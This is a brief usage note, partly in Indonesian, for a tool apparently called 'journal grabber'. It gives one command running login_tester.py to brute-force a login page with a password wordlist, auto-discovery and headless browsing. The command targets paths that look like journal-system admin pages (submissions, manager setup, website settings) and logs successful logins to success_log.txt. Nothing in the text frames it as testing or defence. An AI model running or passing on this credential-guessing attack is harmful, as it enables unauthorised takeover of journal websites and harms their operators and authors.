how to use journal grabber

python login_tester.py \
--url https://namadomain.com/akseslogin \
--user_field "form[action*='login'] input[name='username']" \
--pass_field "form[action*='login'] input[name='password']" \
--wordlist wordlist.txt \
--auto_discover \
--target_paths "submissions,manager/setup/1,management/settings/website" \
--delay 2 \
--headless

setelah selesai running diatas, result nya bisa dicek di success_log.txt
